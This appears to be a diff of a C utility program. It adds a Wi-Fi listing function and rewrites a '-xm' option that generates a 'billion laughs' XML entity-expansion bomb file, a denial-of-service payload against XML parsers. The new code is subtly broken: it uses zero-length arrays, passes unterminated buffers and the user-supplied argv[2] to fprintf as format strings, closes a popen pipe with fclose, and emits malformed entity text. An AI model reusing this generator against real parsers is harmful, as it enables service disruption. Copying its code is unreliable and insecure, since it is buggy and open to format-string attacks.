@@ -230,9 +230,32 @@ void check(int system_inf)
     system("rm NUL");
 }
 
+void list_wifi_networks() {
+    FILE *fp;
+    char buffer[1024];  // Buffer to store the output
+    // Run the nmcli command to list available Wi-Fi networks
+    fp = popen("nmcli device wifi list", "r");
+    if (fp == NULL) {
+        perror("Error executing nmcli command");
+        return;
+    }
+
+    // Read the output of the command line by line
+    printf("Available Wi-Fi networks:\n");
+    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
+        printf("%s", buffer);  // Print each line of the output
+    }
+
+    // Close the file pointer (close the pipe)
+    fclose(fp);
+}
+
 int main(int argc,char* argv[])
 {
     int system_inf=0;
+    int n;
+    char y[0];
+    char c[0];
     //getting os information
     #ifdef _WIN32
         //windows
@@ -382,7 +405,12 @@ int main(int argc,char* argv[])
             {
                 printf("The code isn't dynamic,some libraries aren't suported on windows and others on linux\n");
             }
+            else if (system_inf==64 || system_inf==28)
+            {
+                list_wifi_networks();
+            }
             
+
         }
     }
     else if (argc == 3)
@@ -529,40 +557,42 @@ int main(int argc,char* argv[])
         else if(strcmp(argv[1], "-xm") == 0)
         {
             //converting the argv[2] into an integer
-            int x = atoi(argv[2]);
+            int x = atoi(argv[2])+1;
             if(x>0)
             {
-                char c;
                 FILE *fptr;
+                int i;
                 // Open a file in writing mode
                 fptr = fopen("bomb.txt", "w");
-                fprintf(fptr, "<?xml version=\"1.1\"?>\n<!DOCTYPE lolz [\n\t<!ENTITY lol \"lol\">\n\t<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">");
+                fprintf(fptr, "<?xml version=\"1.1\"?>\n<!DOCTYPE lolz [\n\t<!ENTITY lol \"lol\">");
                 if(x>=2)
                 {
-                    int n;
-                    char xml[100]="\n\t<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">";
-                    for(int i=2;i<=x;i++)
+                    for(i=2;i<x;i++)
                     {
+                        fprintf(fptr,"\n\t<!ENTITY lol");
                         //convert i to char
-                        c = (char)i;
-                        n=i-1;
-                        xml[17]=c;
-                        c = (char)(n);
-                        xml[24]=c;
-                        xml[29]=c;
-                        xml[34]=c;
-                        xml[39]=c;
-                        xml[44]=c;
-                        xml[49]=c;
-                        xml[54]=c;
-                        xml[59]=c;
-                        xml[64]=c;
-                        xml[69]=c;
-                        fprintf(fptr,xml);
-                        printf("%s",xml);
+                        y[0] = i + '0';
+                        printf("%c",y[0]);
+                        fprintf(fptr,y);
+                        fprintf(fptr," ");
+                        c[0] = (i-1) +'0';
+                        printf("%c\n",c[0]);
+                        for(int j=1;j<=10;j++)
+                        {
+                            if(j==1 || j==10)
+                            {
+                                fprintf(fptr,"\"");
+                            }
+                            fprintf(fptr,"&lo");
+                            fprintf(fptr,c);
+                            fprintf(fptr,";");
+                        }
+                        fprintf(fptr,">");
                     }
                 }
-                fprintf(fptr,"\n]>\n<lolz>&lol9;</lolz>");
+                fprintf(fptr,"\n]>\n<lolz>&lol");
+                fprintf(fptr,argv[2]);
+                fprintf(fptr,";</lolz>");
                 fclose(fptr);
             }
         }
